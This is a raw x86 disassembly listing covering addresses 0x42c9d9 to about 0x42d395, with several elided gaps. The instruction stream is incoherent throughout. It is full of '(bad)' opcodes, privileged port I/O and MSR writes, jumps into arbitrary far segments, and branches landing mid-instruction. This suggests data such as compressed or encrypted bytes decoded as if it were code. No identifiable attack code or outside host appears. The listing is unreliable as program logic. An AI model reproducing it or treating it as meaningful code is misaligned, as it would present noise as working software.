  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0x742c87d1
  42c9e6:	pusha  
  42c9e7:	fld    QWORD PTR [ecx]
  42c9e9:	add    bh,bh
  42c9eb:	add    BYTE PTR [eax],al
  42c9ed:	add    dh,bh
  42c9ef:	xor    edi,eax
  42c9f1:	stos   DWORD PTR es:[edi],eax
  42c9f2:	std    
  42c9f3:	in     al,dx
  42c9f4:	scas   eax,DWORD PTR es:[edi]
  42c9f5:	das    
  42c9f6:	adc    esi,esi
  42c9f8:	cwde   
  42c9f9:	cld    
  42c9fa:	dec    DWORD PTR ds:0x3af6f2a4
  42ca00:	sbb    eax,DWORD PTR [edi]
  42ca02:	xchg   ecx,eax
  42ca03:	sahf   
  42ca04:	or     DWORD PTR [edx],esi
  42ca06:	aad    0x32
  42ca08:	inc    eax
  42ca09:	sub    cl,BYTE PTR [ebp+0x57abf611]
  42ca0f:	mov    edi,0x2e29b749
  42ca14:	(bad)  
  42ca15:	add    BYTE PTR [eax],dh
  42ca17:	sbb    BYTE PTR [edx+0x5a],cl
  42ca1a:	and    BYTE PTR ds:0x9efc758b,ch
  42ca20:	push   cs
  42ca21:	jg     0x42c9cb
  42ca23:	imul   edi,DWORD PTR [ebx-0x7125a070],0xfcea1a8c
  42ca2d:	push   edx
  42ca2e:	sub    dl,BYTE PTR [esi-0x22]
  42ca31:	jb     0x42c9b4
  42ca33:	adc    eax,0x74bb928a
  42ca38:	jne    0x42ca8e
  42ca3a:	out    dx,eax
  42ca3b:	add    DWORD PTR [ecx],0x38
  42ca3e:	cmc    
  42ca3f:	jne    0x42caa7
  42ca41:	mov    al,ds:0x4f448558
  42ca46:	gs pushf 
  42ca48:	into   
  42ca49:	outs   dx,BYTE PTR ds:[esi]
  42ca4a:	mov    DWORD PTR [ebx],edi
  42ca4c:	ror    DWORD PTR [esi-0x614ac065],1
  42ca52:	mov    ecx,DWORD PTR [edx+0x4b1cb44b]
  42ca58:	xchg   edx,eax
  42ca59:	das    
  42ca5a:	dec    edi
  42ca5b:	aaa    
  42ca5c:	adc    BYTE PTR [esi+0x5],0xb5
  42ca60:	xor    edx,DWORD PTR [ebx+0x62863aa0]
  42ca66:	sub    al,bh
  42ca68:	(bad)  
  42ca69:	pop    ebp
  42ca6a:	mov    esi,0xa1d48b9e
  42ca6f:	xchg   ebp,ebx
  42ca71:	fist   DWORD PTR [ebx-0x76]
  42ca74:	and    al,0x8a
  42ca76:	xchg   esp,eax
  42ca77:	add    BYTE PTR [eax],ch
  42ca79:	dec    edi
  42ca7a:	pop    ebp
  42ca7b:	int3   
  42ca7c:	xchg   esp,eax
  42ca7d:	fdivr  st,st(7)
  42ca7f:	jbe    0x42cac2
  42ca81:	push   0xa
  42ca83:	pusha  
  42ca84:	cld    
  42ca85:	aam    0xed
  42ca87:	and    edx,DWORD PTR [edx]
  42ca89:	rcr    DWORD PTR [ebx+0x4d09d437],cl
  42ca8f:	loope  0x42cadd
  42ca91:	pop    eax
  42ca92:	push   0x63
  42ca94:	mov    ds:0x2683b008,al
  42ca99:	imul   ecx,DWORD PTR [ecx+eiz*4],0xffffff88
  42ca9d:	retf   0xad7a
  42caa0:	je     0x42cacc
  42caa2:	enter  0x9667,0x47
  42caa6:	cmc    
  42caa7:	repnz (bad) 
  42caa9:	(bad)  ds:0xf5516861
  42caaf:	lahf   
  42cab0:	jle    0x42ca48
  42cab2:	ret    
  42cab3:	inc    ecx
  42cab4:	je     0x42ca48
  42cab6:	and    BYTE PTR [ebx-0x64831901],al
  42cabc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cabd:	mov    fs,WORD PTR ds:0xe39e7f49
  42cac3:	lahf   
  42cac4:	cmp    BYTE PTR [edx+esi*2],bl
  42cac7:	mov    ecx,0xf14e6161
  42cacc:	inc    esi
  42cacd:	xor    DWORD PTR [eax*2-0x5a60fc9f],0xffffffd9
  42cad5:	push   ecx
  42cad6:	shr    BYTE PTR [edi+0x124a48e2],cl
  42cadc:	sbb    bh,BYTE PTR [ecx+0x2e]
  42cadf:	or     DWORD PTR [ebx-0x340df031],ebp
  42cae5:	dec    ebp
  42cae6:	jne    0x42ca93
  42cae8:	sub    DWORD PTR [ebp-0x65],edi
  42caeb:	test   bl,al
	...
  42cb55:	add    BYTE PTR [edi-0x2be7726],ah
  42cb5b:	push   ebx
  42cb5c:	out    dx,eax
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp-0x79df9140]
  42cb64:	cmc    
  42cb65:	adc    DWORD PTR [edi-0x22],ebx
  42cb68:	add    DWORD PTR [eax],eax
  42cb6a:	inc    DWORD PTR [eax]
  42cb6c:	add    BYTE PTR [eax],al
  42cb6e:	jecxz  0x42cbc1
  42cb70:	adc    bh,BYTE PTR [ebp+0x27]
  42cb73:	daa    
  42cb74:	or     DWORD PTR [ebp+edi*4+0x2a216229],ebx
  42cb7b:	and    BYTE PTR [ebp+0xde8670f],al
  42cb81:	imul   ebp,DWORD PTR [ecx+0x24596245],0xfffffffd
  42cb88:	in     al,0xfa
  42cb8a:	fs cmp al,0x8f
  42cb8d:	xor    eax,0x18050c8b
  42cb92:	add    al,0xe9
  42cb94:	adc    dh,bl
  42cb96:	jle    0x42cbf8
  42cb98:	adc    ebp,DWORD PTR [ebx+edx*2]
  42cb9b:	xchg   ebx,eax
  42cb9c:	mov    eax,ds:0x94b5097e
  42cba1:	(bad)  
  42cba2:	div    cl
  42cba4:	popf   
  42cba5:	into   
  42cba6:	cmc    
  42cba7:	stos   BYTE PTR es:[edi],al
  42cba8:	mov    ebp,0xf61d5b0b
  42cbad:	pop    edx
  42cbae:	sbb    DWORD PTR [edx-0x76088ec1],ecx
  42cbb4:	lods   eax,DWORD PTR ds:[esi]
  42cbb5:	sbb    esi,DWORD PTR [ecx+edx*4+0x5c]
  42cbb9:	gs jne 0x42cbd5
  42cbbc:	push   0x95ea3e45
  42cbc1:	pop    ebx
  42cbc2:	xchg   BYTE PTR ds:0xbc68a4b7,al
  42cbc8:	adc    DWORD PTR [ebx+0x42],ebp
  42cbcb:	dec    esp
  42cbcc:	add    BYTE PTR [ebx-0x30],ah
  42cbcf:	jb     0x42cb5d
  42cbd1:	inc    edi
  42cbd2:	js     0x42cb98
  42cbd4:	cmp    ch,BYTE PTR [eax+eiz*1-0xe1096ff]
  42cbdb:	vpaddw ymm0,ymm7,YMMWORD PTR [esi]
  42cbdf:	or     bl,BYTE PTR [eax-0x38]
  42cbe2:	sub    eax,0xe86640b9
  42cbe7:	lea    edi,[eax-0x41]
  42cbea:	mov    dl,0x6c
  42cbec:	out    0x9e,eax
  42cbee:	lahf   
  42cbef:	sbb    bl,bh
  42cbf1:	loopne 0x42cc57
  42cbf3:	sbb    BYTE PTR [edi+0x6b0d7a97],bh
  42cbf9:	mov    al,ds:0x2726ee19
  42cbfe:	scas   eax,DWORD PTR es:[edi]
  42cbff:	rcr    BYTE PTR [esp+ebx*8-0x4f],0x94
  42cc04:	pop    edi
  42cc05:	jnp    0x42cbe7
  42cc07:	sbb    al,0x84
  42cc09:	popf   
  42cc0a:	clc    
  42cc0b:	fsubr  QWORD PTR [esi]
  42cc0d:	jecxz  0x42cbd1
  42cc0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc10:	xchg   edx,eax
  42cc11:	cwde   
  42cc12:	je     0x42cbd9
  42cc14:	outs   dx,BYTE PTR ds:[esi]
  42cc15:	pop    es
  42cc16:	dec    edi
  42cc17:	daa    
  42cc18:	out    0xca,eax
  42cc1a:	mov    bh,dl
  42cc1c:	inc    ecx
  42cc1d:	int3   
  42cc1e:	mov    edi,0x619e812b
  42cc23:	dec    edx
  42cc24:	or     DWORD PTR [edx-0x6d9ed8bb],ecx
  42cc2a:	cld    
  42cc2b:	cmp    BYTE PTR [eax-0x4b822eb0],ch
  42cc31:	xchg   ecx,eax
  42cc32:	xchg   BYTE PTR [ecx-0x6d],bl
  42cc35:	cmc    
  42cc36:	daa    
  42cc37:	jmp    0x7f7d:0x7994ac61
  42cc3e:	loop   0x42cc84
  42cc40:	sbb    BYTE PTR [ecx+0x1201b97],0x42
  42cc47:	out    0x17,al
  42cc49:	cmp    eax,0x6e3eb6f3
  42cc4e:	mov    edi,edx
  42cc50:	xchg   DWORD PTR [eax+0x21],eax
  42cc53:	enter  0x6e82,0xb2
  42cc57:	jb     0x42cbf6
  42cc59:	pop    ebp
  42cc5a:	and    al,0x67
  42cc5c:	push   ebp
  42cc5d:	repnz loopne 0x42cc0f
  42cc60:	nop
  42cc61:	mov    bh,0xa1
  42cc63:	mov    cl,0x80
  42cc65:	rcl    BYTE PTR [ecx+0x6f],1
  42cc68:	cli    
  42cc69:	(bad)  
  42cc6a:	sub    al,0x14
  42cc6c:	xor    al,0x0
	...
  42ccd6:	jg     0x42ccda
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0xa479bccc
  42cce6:	pop    esi
  42cce7:	fild   WORD PTR [ecx]
  42cce9:	add    bh,bh
  42cceb:	add    BYTE PTR [eax],al
  42cced:	add    BYTE PTR [ebx],al
  42ccef:	sub    ebp,DWORD PTR [edx+0x46]
  42ccf2:	adc    eax,0xdc8f7b2
  42ccf7:	or     BYTE PTR [eax],bh
  42ccf9:	ret    0xa930
  42ccfc:	fisubr WORD PTR [edx+ecx*2]
  42ccff:	ja     0x42cd3c
  42cd01:	es (bad) 
  42cd03:	cs nop
  42cd05:	sbb    BYTE PTR [edx],0xf4
  42cd08:	xchg   ecx,eax
  42cd09:	sub    bh,BYTE PTR [edi+edx*8-0x33]
  42cd0d:	fdivr  st(4),st
  42cd0f:	je     0x42cd47
  42cd11:	js     0x42cd20
  42cd13:	jo     0x42ccd9
  42cd15:	scas   al,BYTE PTR es:[edi]
  42cd16:	pop    ebp
  42cd17:	in     al,0x36
  42cd19:	pop    ss
  42cd1a:	fisubr WORD PTR ds:0x78cf82a8
  42cd20:	in     al,0xc4
  42cd22:	jo     0x42cd66
  42cd24:	daa    
  42cd25:	pop    edx
  42cd26:	adc    al,0x5f
  42cd28:	sub    eax,0xcb5d48b1
  42cd2d:	sbb    BYTE PTR [esi],0x59
  42cd30:	or     BYTE PTR [ebp-0x18aa3c09],dh
  42cd36:	mov    edi,0x2d5251b3
  42cd3b:	fcmovne st,st(1)
  42cd3d:	scas   eax,DWORD PTR es:[edi]
  42cd3e:	xor    al,0xf
  42cd40:	fs out 0x52,al
  42cd43:	lahf   
  42cd44:	and    ebx,DWORD PTR [esi+eax*8-0x1fa41bd1]
  42cd4b:	ja     0x42cdcb
  42cd4d:	mov    bl,0x2c
  42cd4f:	cmp    BYTE PTR [edx+ebp*4-0x3c3d0c75],dl
  42cd56:	adc    BYTE PTR [eax+0x37],bh
  42cd59:	in     eax,0x6c
  42cd5b:	icebp  
  42cd5c:	or     DWORD PTR [ecx+0x10f9c520],edi
  42cd62:	sub    al,0xdf
  42cd64:	mov    dh,0x9e
  42cd66:	mov    esi,0xece0db97
  42cd6b:	jne    0x42cd15
  42cd6d:	wrmsr  
  42cd6f:	loop   0x42cd0e
  42cd71:	add    al,0xd5
  42cd73:	and    BYTE PTR [esi+0x6b],0x56
  42cd77:	dec    edi
  42cd78:	mov    ebp,0xd8ed5d33
  42cd7d:	test   ah,bh
  42cd7f:	repz mov cl,BYTE PTR [edx+ebp*1+0x5130a7f9]
  42cd87:	retf   0x2764
  42cd8a:	test   al,0xca
  42cd8c:	push   ds
  42cd8d:	cmp    eax,0xd80cf9d4
  42cd92:	fwait
  42cd93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd94:	test   BYTE PTR [esi],al
  42cd96:	iret   
  42cd97:	push   esi
  42cd98:	lds    edx,FWORD PTR [esi+esi*2-0x63f1f31d]
  42cd9f:	mov    cl,0x73
  42cda1:	jecxz  0x42cd6f
  42cda3:	adc    al,0xff
  42cda5:	jns    0x42cda5
  42cda7:	out    0x4a,eax
  42cda9:	loope  0x42cdde
  42cdab:	pop    ss
  42cdac:	xchg   edx,eax
  42cdad:	adc    BYTE PTR [ebp+0x7b],al
  42cdb0:	mov    edx,0xf84696f3
  42cdb5:	mov    ds:0xd10441f4,eax
  42cdba:	mov    dh,0xf
  42cdbc:	jl     0x42cd65
  42cdbe:	repnz push es
  42cdc0:	xor    dl,BYTE PTR [edx]
  42cdc2:	inc    esi
  42cdc3:	xchg   edx,eax
  42cdc4:	mov    gs,WORD PTR [esi-0x6865100]
  42cdca:	mov    edx,0xbe117661
  42cdcf:	lds    esi,FWORD PTR [ecx+0x4e0d71c4]
  42cdd5:	out    0xb0,al
  42cdd7:	shl    esp,1
  42cdd9:	in     al,0xbc
  42cddb:	mov    ebp,DWORD PTR [eax-0x3cf1723a]
  42cde1:	(bad)  
  42cde3:	and    BYTE PTR [edi-0x1e],al
  42cde6:	sar    BYTE PTR [eax-0x7e],0x9d
  42cdea:	sbb    eax,0xefa5
	...
  42ce53:	add    BYTE PTR [eax],al
  42ce55:	add    BYTE PTR [ecx],bl
  42ce57:	mov    eax,ds:0xdffe87fe
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0xbc
  42ce63:	sub    al,0xbb
  42ce65:	mov    ds:0x1e05d,al
  42ce6a:	inc    DWORD PTR [eax]
  42ce6c:	add    BYTE PTR [eax],al
  42ce6e:	sbb    al,0xac
  42ce70:	inc    eax
  42ce71:	jl     0x42ce2c
  42ce73:	out    0xd7,al
  42ce75:	out    0xe,al
  42ce77:	adc    DWORD PTR ds:[edi],edi
  42ce7a:	(bad)  
  42ce7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce7c:	inc    edi
  42ce7d:	mov    edx,0x29532256
  42ce82:	or     eax,0x575a25ae
  42ce87:	ja     0x42ce3d
  42ce89:	ins    DWORD PTR es:[edi],dx
  42ce8a:	lea    ecx,[ecx+0x6]
  42ce8d:	inc    esi
  42ce8e:	xchg   esi,eax
  42ce8f:	out    0x4d,eax
  42ce91:	adc    DWORD PTR [edx-0x1cf153],0x7e
  42ce98:	cmp    al,0x16
  42ce9a:	das    
  42ce9b:	or     BYTE PTR [edi+ebp*4-0x1b],0xc8
  42cea0:	mov    dl,0xc5
  42cea2:	(bad)  
  42cea3:	dec    eax
  42cea4:	ins    BYTE PTR es:[edi],dx
  42cea5:	call   0x90fa:0x147bcc80
  42ceac:	iret   
  42cead:	jmp    0x42ceaa
  42ceaf:	(bad)  
  42ceb1:	sub    BYTE PTR [ecx+0x4dd99f90],dh
  42ceb7:	jae    0x42cebf
  42ceb9:	das    
  42ceba:	stos   BYTE PTR es:[edi],al
  42cebb:	or     BYTE PTR [eax+0x73],dl
  42cebe:	lods   al,BYTE PTR ds:[esi]
  42cebf:	inc    ebx
  42cec0:	stos   DWORD PTR es:[edi],eax
  42cec1:	in     eax,dx
  42cec2:	lock (bad) 
  42cec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cec5:	mov    ebx,0x4c42da9c
  42ceca:	leave  
  42cecb:	pop    esp
  42cecc:	cmp    BYTE PTR [eax-0x30],dh
  42cecf:	daa    
  42ced0:	fwait
  42ced1:	ins    BYTE PTR es:[edi],dx
  42ced2:	mov    bl,0x48
  42ced4:	push   cs
  42ced5:	sar    DWORD PTR [edi],1
  42ced7:	push   ss
  42ced8:	rcl    ecx,0x1c
  42cedb:	arpl   si,si
  42cedd:	sbb    edi,eax
  42cedf:	push   cs
  42cee0:	into   
  42cee1:	add    eax,0x4e6a4485
  42cee6:	in     eax,0xe0
  42cee8:	outs   dx,BYTE PTR ds:[esi]
  42cee9:	push   edi
  42ceea:	mov    DWORD PTR ds:0x10c49b4f,ebx
  42cef0:	pushf  
  42cef1:	push   cs
  42cef2:	xor    al,0x55
  42cef4:	or     BYTE PTR [edi+edx*1+0x4dc51148],bh
  42cefb:	comiss xmm7,xmm2
  42cefe:	sbb    al,0xe3
  42cf00:	arpl   bx,cx
  42cf02:	ficomp WORD PTR [edx+edx*4]
  42cf05:	mov    ecx,0x107fd0ea
  42cf0a:	(bad)  
  42cf0b:	sub    bl,BYTE PTR [eax+0x19b9630f]
  42cf11:	or     esp,DWORD PTR [esi]
  42cf13:	xchg   BYTE PTR [edx-0x2b],ah
  42cf16:	out    0xff,eax
  42cf18:	adc    DWORD PTR [esp+eax*8+0x268bb20b],0x67c57c1
  42cf23:	sub    ebp,DWORD PTR [edx+0x11ff79ca]
  42cf29:	pop    es
  42cf2a:	aaa    
  42cf2b:	inc    ebp
  42cf2c:	imul   ebp,DWORD PTR [si+0x5f21],0x7d49ae5c
  42cf35:	mov    bh,0x43
  42cf37:	inc    edi
  42cf38:	jbe    0x42cf0e
  42cf3a:	dec    ecx
  42cf3b:	mov    ebx,0x513efba6
  42cf40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf41:	inc    ebp
  42cf42:	lock out 0xf9,al
  42cf45:	xchg   esi,eax
  42cf46:	jmp    0x8992f6ab
  42cf4b:	sub    al,0x3d
  42cf4d:	xchg   ebp,eax
  42cf4e:	push   edi
  42cf4f:	jmp    0x4fdd5cc9
  42cf54:	les    edx,FWORD PTR [ecx-0x35]
  42cf57:	repnz leave 
  42cf59:	sub    DWORD PTR [esi-0x9],esp
  42cf5c:	js     0x42cf55
  42cf5e:	into   
  42cf5f:	lods   eax,DWORD PTR ds:[esi]
  42cf60:	push   cs
  42cf61:	cmp    al,0xd0
  42cf63:	imul   esp,DWORD PTR [ebx],0x20f09c22
  42cf69:	(bad)  
  42cf6a:	shr    DWORD PTR [eax],cl
  42cf6c:	sbb    al,0x0
	...
  42cfd6:	jae    0x42d015
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	les    ebx,FWORD PTR [eax+esi*8-0x1ea3bba2]
  42cfe8:	add    DWORD PTR [eax],eax
  42cfea:	inc    DWORD PTR [eax]
  42cfec:	add    BYTE PTR [eax],al
  42cfee:	ret    0xec3d
  42cff1:	jo     0x42d039
  42cff3:	inc    ebp
  42cff4:	xchg   ebx,eax
  42cff5:	add    ecx,ebp
  42cff7:	mov    edx,DWORD PTR [esi]
  42cff9:	mov    bh,0x2
  42cffb:	dec    ebx
  42cffc:	sbb    esi,ebx
  42cffe:	dec    edx
  42cfff:	xchg   esp,eax
  42d000:	hlt    
  42d001:	cmp    BYTE PTR [edi+0x11],al
  42d004:	add    cl,al
  42d006:	add    DWORD PTR ds:[esi+0x2c],edx
  42d00a:	ins    BYTE PTR es:[edi],dx
  42d00b:	sub    cl,al
  42d00d:	icebp  
  42d00e:	pop    es
  42d00f:	adc    al,0x3f
  42d011:	(bad)
  42d014:	sti    
  42d015:	jnp    0x42cff3
  42d017:	jo     0x42d024
  42d019:	dec    ecx
  42d01a:	push   ss
  42d01b:	jmp    0x42cfe5
  42d01d:	push   edi
  42d01e:	call   0x32d0:0xee37cf3d
  42d025:	call   0x713b470c
  42d02a:	jo     0x42d0a9
  42d02c:	mov    dh,0x74
  42d02e:	jmp    0xca2c:0x49c738f1
  42d035:	push   ds
  42d036:	mov    ds:0x73e5ba65,eax
  42d03b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d03c:	or     al,0xb3
  42d03e:	rol    DWORD PTR [ebp-0x51],0x23
  42d042:	jno    0x42d061
  42d044:	cli    
  42d045:	pop    esi
  42d046:	call   0xc8246e69
  42d04b:	add    BYTE PTR es:[ebx+ecx*1],0x60
  42d050:	cli    
  42d051:	loope  0x42d060
  42d053:	adc    BYTE PTR [edx*4+0x1bf16662],al
  42d05a:	cdq    
  42d05b:	pop    ds
  42d05c:	in     eax,dx
  42d05d:	dec    ebx
  42d05e:	das    
  42d05f:	push   edx
  42d060:	dec    eax
  42d061:	shl    DWORD PTR [ecx-0x54f6af18],0xc4
  42d068:	cmp    al,0xcb
  42d06a:	inc    ebp
  42d06b:	nop
  42d06c:	fsub   DWORD PTR [edx+edx*1-0x2f]
  42d070:	jb     0x42d08d
  42d072:	add    cl,BYTE PTR [edx]
  42d074:	(bad)  
  42d075:	repz push ebx
  42d077:	add    ebp,edx
  42d079:	xor    ebp,ebp
  42d07b:	lods   al,BYTE PTR ds:[esi]
  42d07c:	aad    0xa3
  42d07e:	jl     0x42d0a1
  42d080:	clc    
  42d081:	mov    WORD PTR ds:[ebp+0x584a311e],es
  42d088:	aas    
  42d089:	dec    ecx
  42d08a:	inc    ebx
  42d08b:	clc    
  42d08c:	daa    
  42d08d:	sbb    DWORD PTR [eax],0x61b390ee
  42d093:	mov    esi,0xb462cc75
  42d098:	xor    al,0xb3
  42d09a:	jns    0x42d118
  42d09c:	ins    DWORD PTR es:[edi],dx
  42d09d:	xor    esi,edi
  42d09f:	push   ebp
  42d0a0:	mov    ds,ecx
  42d0a2:	clc    
  42d0a3:	adc    bh,BYTE PTR [ebx]
  42d0a5:	pop    ecx
  42d0a6:	(bad)  
  42d0a7:	ja     0x42d102
  42d0a9:	mov    ecx,DWORD PTR [edx]
  42d0ab:	(bad)
  42d0af:	inc    ebx
  42d0b0:	mov    esp,ss
  42d0b2:	push   ecx
  42d0b3:	outs   dx,DWORD PTR ds:[esi]
  42d0b4:	sahf   
  42d0b5:	pop    ds
  42d0b6:	call   0x6592:0xb06552f
  42d0bd:	push   0xca5f48ea
  42d0c2:	sbb    BYTE PTR [edi+0x430c525c],dl
  42d0c8:	xor    DWORD PTR [eax+eiz*4+0xf88c0ed],ecx
  42d0cf:	dec    esi
  42d0d0:	cmp    BYTE PTR [eax],bl
  42d0d2:	std    
  42d0d3:	cmp    ebp,ecx
  42d0d5:	mov    al,ds:0x737d651f
  42d0da:	pop    ds
  42d0db:	xchg   ebx,eax
  42d0dc:	push   0x90558cd2
  42d0e1:	mov    ds:0x5b8cb595,al
  42d0e6:	adc    al,0xa1
  42d0e8:	lds    edi,FWORD PTR [ebx-0x2e]
  42d0eb:	and    DWORD PTR [esi+0x0],ecx
	...
  42d155:	add    BYTE PTR [eax+0x3a],dl
  42d158:	(bad)  
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    BYTE PTR [ecx-0x3b],cl
  42d164:	(bad)
  42d167:	loop   0x42d16a
  42d169:	add    bh,bh
  42d16b:	add    BYTE PTR [eax],al
  42d16d:	add    BYTE PTR [ecx],al
  42d16f:	mov    ah,0x5a
  42d171:	into   
  42d172:	scas   al,BYTE PTR es:[edi]
  42d173:	adc    dl,BYTE PTR [eax]
  42d175:	aas    
  42d176:	add    al,0xf2
  42d178:	das    
  42d179:	sbb    esi,esi
  42d17b:	ret    0xd815
  42d17e:	push   esi
  42d17f:	call   0x509ed3a4
  42d184:	jle    0x42d135
  42d186:	xchg   BYTE PTR ds:0x94bc46c8,bl
  42d18c:	in     eax,dx
  42d18d:	sub    DWORD PTR [edi-0x34],ebp
  42d190:	add    ch,BYTE PTR [esi+0x7f7b23f0]
  42d196:	ins    BYTE PTR es:[edi],dx
  42d197:	mov    esi,0xe517bd8d
  42d19c:	dec    esp
  42d19d:	mov    edi,0xc4ae9acb
  42d1a2:	(bad)  
  42d1a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d1a4:	into   
  42d1a5:	inc    edx
  42d1a6:	push   es
  42d1a7:	shr    cl,cl
  42d1a9:	into   
  42d1aa:	(bad)  
  42d1ab:	cmp    eax,0x36ec6533
  42d1b0:	cmp    eax,0x4bea19ec
  42d1b5:	adc    DWORD PTR [ebx],esi
  42d1b7:	pop    edi
  42d1b8:	fist   DWORD PTR [edx+0x5ae5d696]
  42d1be:	or     eax,0xfb99e739
  42d1c3:	iret   
  42d1c4:	jo     0x42d160
  42d1c6:	stc    
  42d1c7:	daa    
  42d1c8:	lods   eax,DWORD PTR ds:[esi]
  42d1c9:	adc    eax,0xd8c95682
  42d1ce:	jae    0x42d230
  42d1d0:	stos   BYTE PTR es:[edi],al
  42d1d1:	rdgsbase esi
  42d1d5:	fidivr DWORD PTR [ebx+eax*1+0x9]
  42d1d9:	hlt    
  42d1da:	das    
  42d1db:	cmp    ecx,edx
  42d1dd:	out    0xf7,eax
  42d1df:	add    ecx,ebp
  42d1e1:	int    0x13
  42d1e3:	mov    ebp,0x165d123c
  42d1e8:	push   es
  42d1e9:	mov    dh,0x69
  42d1eb:	mov    ah,0xa1
  42d1ed:	adc    ah,BYTE PTR [edi-0xb]
  42d1f0:	sti    
  42d1f1:	hlt    
  42d1f2:	js     0x42d201
  42d1f4:	imul   ecx,DWORD PTR [edx],0x704d1f9a
  42d1fa:	add    BYTE PTR [ecx],0x43
  42d1fd:	cmc    
  42d1fe:	pusha  
  42d1ff:	rol    ch,cl
  42d201:	xchg   BYTE PTR [esi+0x3635108e],dl
  42d207:	clc    
  42d208:	or     DWORD PTR [edi+0x73f96b00],edi
  42d20e:	cmp    DWORD PTR [edi-0xb4517da],0xffffffe1
  42d215:	xchg   BYTE PTR [edx],bl
  42d217:	xchg   BYTE PTR [edx+0x16],dh
  42d21a:	aad    0x9c
  42d21c:	ret    0x3df0
  42d21f:	iret   
  42d220:	or     eax,ecx
  42d222:	jle    0x42d209
  42d224:	js     0x42d1f1
  42d226:	(bad)  
  42d227:	std    
  42d228:	jg     0x42d275
  42d22a:	test   al,0x67
  42d22c:	mov    DWORD PTR [eax-0x20],edi
  42d22f:	sbb    edi,esp
  42d231:	add    BYTE PTR [esi-0x32],al
  42d234:	adc    ecx,edx
  42d236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d237:	push   ebx
  42d238:	jmp    0x42d291
  42d23a:	inc    ebp
  42d23b:	aaa    
  42d23c:	stos   BYTE PTR es:[edi],al
  42d23d:	test   BYTE PTR [edx-0x45],ch
  42d240:	or     eax,0x63dd5256
  42d245:	mov    ch,0xe
  42d247:	inc    esp
  42d248:	inc    esp
  42d249:	pop    ds
  42d24a:	inc    ebp
  42d24b:	(bad)
  42d24f:	rcl    ecx,1
  42d251:	add    bl,ah
  42d253:	daa    
  42d254:	xor    eax,0xda434356
  42d259:	jne    0x42d2ab
  42d25b:	lods   al,BYTE PTR ds:[esi]
  42d25c:	setae  BYTE PTR [edx]
  42d25f:	mov    edx,edx
  42d261:	mov    dl,0x14
  42d263:	out    0x1f,eax
  42d265:	push   cs
  42d266:	mov    esi,0x4e078ee6
  42d26b:	gs cmc 
	...
  42d2d5:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d2bb
  42d2e3:	test   eax,0xe35af401
  42d2e8:	add    DWORD PTR [eax],eax
  42d2ea:	inc    DWORD PTR [eax]
  42d2ec:	add    BYTE PTR [eax],al
  42d2ee:	(bad)  
  42d2ef:	nop
  42d2f0:	sub    eax,0xe1383395
  42d2f5:	pop    ebx
  42d2f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2f7:	aad    0xb5
  42d2f9:	(bad)  
  42d2fa:	in     al,dx
  42d2fb:	pop    ecx
  42d2fc:	ja     0x42d2e3
  42d2fe:	xor    esi,0x1da23c2b
  42d304:	addr16 and edx,0x2f0422f8
  42d30b:	mov    edx,0xf47d3c59
  42d310:	retf   0x5cee
  42d313:	fs push esp
  42d315:	inc    ecx
  42d316:	int    0xd7
  42d318:	(bad)  
  42d31a:	js     0x42d349
  42d31c:	test   BYTE PTR [ebp+0x35],ah
  42d31f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d320:	mov    ds:0x3b1a5688,al
  42d325:	pop    esp
  42d326:	dec    esi
  42d327:	nop
  42d328:	ins    BYTE PTR es:[edi],dx
  42d329:	js     0x42d2d9
  42d32b:	rcr    BYTE PTR [ecx+edi*4-0xf9f89c6],0x8
  42d333:	test   DWORD PTR [ebx+0x16],0xe4a48c68
  42d33a:	push   ds
  42d33b:	pop    edx
  42d33c:	cmp    esp,0xffffffb6
  42d33f:	push   ebx
  42d340:	je     0x42d368
  42d342:	daa    
  42d343:	jl     0x42d355
  42d345:	and    dh,ah
  42d347:	mov    ds:0x7c82355,al
  42d34c:	lea    esp,[esi]
  42d34e:	xor    eax,0x6ef57096
  42d353:	jp     0x42d385
  42d355:	dec    esp
  42d356:	imul   esi,DWORD PTR [edi+ebp*8-0x4d6195c8],0x7d
  42d35e:	das    
  42d35f:	je     0x42d38b
  42d361:	lods   al,BYTE PTR ds:[esi]
  42d362:	ja     0x42d390
  42d364:	cwde   
  42d365:	rol    BYTE PTR [ecx+0x114ebf52],1
  42d36b:	push   cs
  42d36c:	and    BYTE PTR [esi+0x71],dh
  42d36f:	push   edi
  42d370:	mov    bh,0x24
  42d372:	add    edx,DWORD PTR ds:0x4f8cf8e1
  42d378:	bound  esp,QWORD PTR [ecx+0x12160bee]
  42d37e:	and    ebx,DWORD PTR [esi+0x3]
  42d381:	clc    
  42d382:	sub    eax,0xb9a37ebd
  42d387:	jno    0x42d312
  42d389:	mov    ch,0x70
  42d38b:	mov    eax,0x881b332b
  42d390:	out    0xf4,eax
  42d392:	outs   dx,DWORD PTR ds:[esi]
  42d393:	arpl   si,dx
  42d395:	fsubr  DWORD PTR [eax-0x3c1bb40f]
